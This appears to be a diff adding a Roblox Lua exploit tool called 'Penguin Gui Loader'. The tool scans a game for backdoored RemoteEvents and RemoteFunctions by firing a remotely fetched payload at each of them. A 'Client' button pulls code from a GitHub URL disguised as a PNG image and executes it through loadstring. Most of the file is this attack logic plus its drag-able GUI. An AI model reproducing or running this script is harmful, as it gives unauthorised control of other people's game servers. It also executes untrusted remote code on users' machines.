@@ -1,0 +1,175 @@
+blak = Color3.new(0,0,0)
+blue = Color3.new(0/255,0/255,255/255)
+tef = "SourceSans"
+whit = Color3.new(255/255,255/255,255/255)
+
+function loadServer()
+	local des = game:GetDescendants()
+	local comand = game:HttpGet("https://raw.githubusercontent.com/gleb2803/tester/refs/heads/main/tester.py")
+	comand = string.gsub(comand,"/localplayer/",game.Players.LocalPlayer.Name)
+
+	function notify(text)
+		game:GetService("StarterGui"):SetCore("SendNotification",{
+			Title = "PenguinGui",
+			Text = text, 
+			Icon = "rbxassetid://104745398169988"
+		})
+	end
+
+	function testParent(obj)
+		if obj.Parent.Name == "RobloxReplicatedStorage" then return false end
+		return true
+	end
+
+	function testRE(re)
+		re:FireServer(comand)
+		if game.Players.LocalPlayer.PlayerGui:WaitForChild("PenguinGui",0.1) then
+			return true
+		else
+			return false
+		end
+	end
+
+	function testRF(rf)
+		rf:InvokeServer(comand)
+		if game.Players.LocalPlayer.PlayerGui:WaitForChild("PenguinGui",0.1) then
+			return true
+		else
+			return false
+		end
+	end
+
+	function main()
+		for i,v in pairs(des) do
+			if v:IsA("RemoteEvent") and testParent(v) then
+				if testRE(v) then
+					notify("BackDoor Found")
+					break
+				end
+			elseif v:IsA("RemoteFunction") and testParent(v) then
+				if testRF(v) then
+					notify("BackDoor Found")
+					break
+				end
+			end
+		end
+
+		if game.Players.LocalPlayer.PlayerGui:FindFirstChild("PenguinGui") == nil then
+			notify("BackDoor Not Found")
+		end
+	end
+
+	notify("Search BackDoor")
+
+	local success = pcall(main)
+
+	if not success then notify("Error") end -- Coded by glebmalish_2000 --
+end
+
+function loadClient()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/gleb2803/tester/refs/heads/main/MEME.png"))()
+end
+
+local CreateGUI = function ()
+	local cka = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)
+	cka.Name = "PenguinGuiLoader"
+	cka.DisplayOrder = 1024
+	local frame = Instance.new("Frame",cka)
+	frame.Name = "MainFrame"
+	frame.BackgroundColor3 = blak
+	frame.BorderColor3 = blue
+	frame.BorderSizePixel = 3
+	frame.BackgroundTransparency = 0.5
+	frame.Position = UDim2.new(0.285,0,0.313,0)
+	frame.Size = UDim2.new(0,500,0,250)
+	local clientbtn = Instance.new("TextButton",frame)
+	clientbtn.Name = "ClientButton"
+	clientbtn.BackgroundColor3 = blak
+	clientbtn.BorderColor3 = blue
+	clientbtn.BorderSizePixel = 3
+	clientbtn.BackgroundTransparency = 0.5
+	clientbtn.Font = tef
+	clientbtn.Text = "Client"
+	clientbtn.TextColor3 = whit
+	clientbtn.TextStrokeColor3 = blak
+	clientbtn.TextStrokeTransparency = 0
+	clientbtn.Position = UDim2.new(0.07,0,0.636,0)
+	clientbtn.Size = UDim2.new(0,200,0,50)
+	clientbtn.TextSize = 32
+	local serverbtn = Instance.new("TextButton",frame)
+	serverbtn.Name = "ServerButton"
+	serverbtn.BackgroundColor3 = blak
+	serverbtn.BorderColor3 = blue
+	serverbtn.BorderSizePixel = 3
+	serverbtn.BackgroundTransparency = 0.5
+	serverbtn.Font = tef
+	serverbtn.Text = "Server"
+	serverbtn.TextColor3 = whit
+	serverbtn.TextStrokeColor3 = blak
+	serverbtn.TextStrokeTransparency = 0
+	serverbtn.Position = UDim2.new(0.53,0,0.636,0)
+	serverbtn.Size = UDim2.new(0,200,0,50)
+	serverbtn.TextSize = 32
+	local label = Instance.new("TextLabel",frame)
+	label.Name = "Title"
+	label.BackgroundColor3 = blak
+	label.BorderColor3 = blue
+	label.BorderSizePixel = 3
+	label.BackgroundTransparency = 0.5
+	label.Font = tef
+	label.Text = "Penguin Gui Loader"
+	label.TextColor3 = whit
+	label.TextStrokeColor3 = blak
+	label.TextStrokeTransparency = 0
+	label.Position = UDim2.new(0,0,0,0)
+	label.Size = UDim2.new(1,0,0,120)
+	label.TextSize = 48
+	
+	return cka
+end
+
+GUI = CreateGUI()
+
+GUI.MainFrame.ClientButton.MouseButton1Down:connect(function()
+	GUI.MainFrame.ClientButton.Interactable = false
+	loadClient()
+	GUI:Destroy()
+end)
+GUI.MainFrame.ServerButton.MouseButton1Down:connect(function()
+	GUI.MainFrame.ServerButton.Interactable = false
+	loadServer()
+	if game.Players.LocalPlayer.PlayerGui:FindFirstChild("PenguinGui") ~= nil then
+		GUI:Destroy()
+	else
+		GUI.MainFrame.ServerButton.BorderColor3 = Color3.new(1,0,0)
+	end
+end)
+local dragToggle = nil
+local dragSpeed = 0.25
+local dragStart = nil
+local startPos = nil
+local function updateInput(input)
+	local delta = input.Position - dragStart
+	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	game:GetService("TweenService"):Create(GUI.MainFrame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+end
+GUI.MainFrame.Title.InputBegan:Connect(function(input)
+	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+		dragToggle = true
+		dragStart = input.Position
+		startPos = GUI.MainFrame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragToggle = false
+			end
+		end)
+	end
+end)
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		if dragToggle then
+			updateInput(input)
+		end
+	end
+end) -- Coded by glebmalish_2000 --
